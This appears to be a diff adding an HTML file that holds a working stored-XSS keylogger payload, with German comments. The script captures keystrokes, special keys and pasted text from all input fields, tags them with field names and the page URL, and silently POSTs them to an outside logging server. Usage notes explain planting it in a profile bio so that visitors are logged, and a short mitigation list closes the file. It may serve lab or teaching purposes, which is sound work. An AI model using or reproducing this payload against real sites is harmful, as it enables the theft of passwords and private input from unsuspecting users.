@@ -1,0 +1,128 @@
+<!--
+XSS Keylogger - Full Keylogger Payload
+Captured alle Tastatureingaben von allen Input-Feldern
+-->
+
+<script>
+(function() {
+    // Unique Session-ID für Gruppierung
+    var sessionId = Math.random().toString(36).substr(2, 9);
+    var buffer = [];
+    var serverUrl = 'http://192.168.1.145:8889/log';
+    var batchSize = 10;
+    var sendInterval = 5000; // 5 Sekunden
+
+    // Funktion zum Senden der Keystrokes
+    function sendKeystrokes() {
+        if (buffer.length === 0) return;
+
+        var data = {
+            keystrokes: buffer,
+            sid: sessionId,
+            page: window.location.href
+        };
+
+        fetch(serverUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        }).catch(function(e) {
+            // Silent fail - nicht auffallen!
+        });
+
+        buffer = [];
+    }
+
+    // Keypress Event Listener
+    document.addEventListener('keypress', function(e) {
+        var fieldName = e.target.name || e.target.id || e.target.type || 'unknown';
+
+        buffer.push({
+            key: e.key,
+            field: fieldName,
+            timestamp: new Date().toISOString()
+        });
+
+        // Send wenn Buffer voll ist
+        if (buffer.length >= batchSize) {
+            sendKeystrokes();
+        }
+    });
+
+    // Auch Backspace, Enter, Tab capturen (keydown)
+    document.addEventListener('keydown', function(e) {
+        // Nur spezielle Tasten
+        if (e.key === 'Backspace' || e.key === 'Enter' || e.key === 'Tab') {
+            var fieldName = e.target.name || e.target.id || e.target.type || 'unknown';
+
+            buffer.push({
+                key: e.key,
+                field: fieldName,
+                timestamp: new Date().toISOString()
+            });
+
+            if (buffer.length >= batchSize) {
+                sendKeystrokes();
+            }
+        }
+    });
+
+    // Paste Event (Strg+V)
+    document.addEventListener('paste', function(e) {
+        var pastedText = (e.clipboardData || window.clipboardData).getData('text');
+        var fieldName = e.target.name || e.target.id || e.target.type || 'unknown';
+
+        // Füge paste als einzelnen "Keystroke" hinzu
+        buffer.push({
+            key: '[PASTE: ' + pastedText.substring(0, 50) + (pastedText.length > 50 ? '...' : '') + ']',
+            field: fieldName,
+            timestamp: new Date().toISOString()
+        });
+
+        sendKeystrokes();
+    });
+
+    // Periodisch senden (alle 5 Sekunden)
+    setInterval(sendKeystrokes, sendInterval);
+
+    // Senden bei Page-Unload
+    window.addEventListener('beforeunload', sendKeystrokes);
+    window.addEventListener('pagehide', sendKeystrokes);
+
+})();
+</script>
+
+<!--
+Verwendung:
+1. Keylogger-Server starten: python server.py
+2. Registriere Account mit diesem Payload im Bio-Feld
+3. Opfer besucht /users Seite
+4. Alle Tastatureingaben werden geloggt
+
+Features:
+- Captured alle Keystrokes (keypress + keydown)
+- Batch-Sending (alle 10 Keys oder 5 Sekunden)
+- Session-Tracking via Random-ID
+- Paste-Event Capture
+- Page Context (URL)
+- Silent Operation (keine Console-Logs)
+
+Captured Keys:
+✅ Normale Zeichen (a-z, 0-9, Sonderzeichen)
+✅ Backspace
+✅ Enter
+✅ Tab
+✅ Paste (Strg+V)
+
+Funktionsweise:
+1. Event Listener für keypress und keydown
+2. Keys werden in Buffer gesammelt
+3. Batch-Sending an Server (Performance!)
+4. Server rekonstruiert Text aus Keys
+
+Mitigation:
+- Content Security Policy (CSP): connect-src 'self'
+- Input Sanitization
+- Virtual Keyboard für Passwords
+- HTTPOnly Cookies
+-->
